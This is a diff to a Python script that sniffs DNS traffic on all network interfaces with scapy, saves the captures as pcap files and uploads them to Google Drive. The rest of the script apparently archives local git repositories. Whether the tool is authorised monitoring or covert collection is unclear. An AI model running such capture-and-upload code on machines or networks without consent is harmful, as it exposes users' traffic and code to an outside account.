@@ -14,6 +14,8 @@ from httplib2 import Http
 from googleapiclient.http import MediaFileUpload
 import uuid
 import scapy.all as scapy
+from scapy.sendrecv import AsyncSniffer
+from time import sleep
 
 cwd=os.getcwd()
 scopes = ['https://www.googleapis.com/auth/drive']
@@ -24,13 +26,12 @@ UUID=hex(uuid.getnode())
 mime_types={'folder':'application/vnd.google-apps.folder','text':'text/plain','pcap':'application/vnd.tcpdump.pcap'}
 today=date.today()
 date_folder_name=today.strftime("%d_%m_%Y")
+snifferList=list()
+interfaces=list()
     
 def get_platform():
 	return sys.platform
-    
-def process_packet(packet):
-    pass
-    return
+
 
 def build_interfaces(platform):
     interfaces = scapy.get_if_list()
@@ -41,27 +42,59 @@ def build_interfaces(platform):
         interfaces= [i for i in interfaces if 'eth' in i]
     return interfaces
 
-def sniff():
-    os.system('mkdir captures')
+def sniff(toggle):
+
+    global snifferList
+    global interfaces
+
     platform=get_platform()
-    print(platform)
+    print("Platform is",platform)
     interfaces=build_interfaces(platform)
-    print(interfaces)
-    for i in interfaces:
-        
-        capture=scapy.sniff(iface=i,filter="port 53",count=10)
-        now = datetime.datetime.now()
-        capName=now.strftime("%Y_%m_%d_%H_%M_%S")
-        dest_folder="captures/{}.pcap".format(capName)
-        scapy.wrpcap(dest_folder,capture, append=True)
-        uploadToDrive(dest_folder,mime_types['pcap']) 
-        os.remove(dest_folder)
-    os.rmdir('captures')
+    print("Interfaces on this platform are",interfaces)
+    
+    if (toggle==1):
+        if (len(snifferList))!=0:
+            print("I am already sniffing!")
+            return
+        print("Starting the packet sniffer!")
+
+        for i in range(len(interfaces)):
+            t=AsyncSniffer(iface=interfaces[i],filter="port 53",count=0)
+            #capture=scapy.sniff(iface=i,filter="port 53",count=10)
+            print("Capturing on interface {}".format(interfaces[i]))
+            t.start()
+            snifferList.append(t)
+    else:
+        if (len(snifferList)==0):
+            print("I have not sniffed anything!")
+            return
+
+        print("Stopping the packet sniffer!")
+        try:
+            os.system('mkdir captures')
+        except:
+        #Dir exists
+            pass
+
+        for i in range(len(interfaces)):
+            print("Stopping capture on interface {}".format(interfaces[i]))
+            capture=snifferList[i].stop()
+            snifferList.remove(snifferList[i])
+            now = datetime.datetime.now()
+            capName=now.strftime("%Y_%m_%d_%H_%M_%S")+interfaces[i]
+            dest_folder="captures/{}.pcap".format(capName)
+            scapy.wrpcap(dest_folder,capture, append=True)
+            uploadToDrive(dest_folder,mime_types['pcap']) 
+            os.remove(dest_folder)
+        try:
+            os.rmdir('captures')
+        except:
+            pass
         
     return
     
 def tardir(repository, dest_folder):
-    print(dest_folder)
+    #print(dest_folder)
     with tarfile.open(dest_folder, mode='w:gz') as archive:
         archive.add(repository, recursive=True)
     return
@@ -78,7 +111,7 @@ def searchFile(fileName,mimeType,parentID):
 
         if len(response.get('files', [])) != 0:
             file=response.get('files', [])[0]
-            print("File is present! Name={} : ID={}".format(file.get('name'),file.get('id')))
+            #print("File is present! Name={} : ID={}".format(file.get('name'),file.get('id')))
             return file.get('id')
 
         page_token = response.get('nextPageToken', None)
@@ -206,5 +239,6 @@ def get_git_repos():
 if __name__ == '__main__':
     
     get_git_repos()
-    print("Sniffing!")
-    sniff()
+    sniff(1)
+    sleep(40)
+    sniff(0)
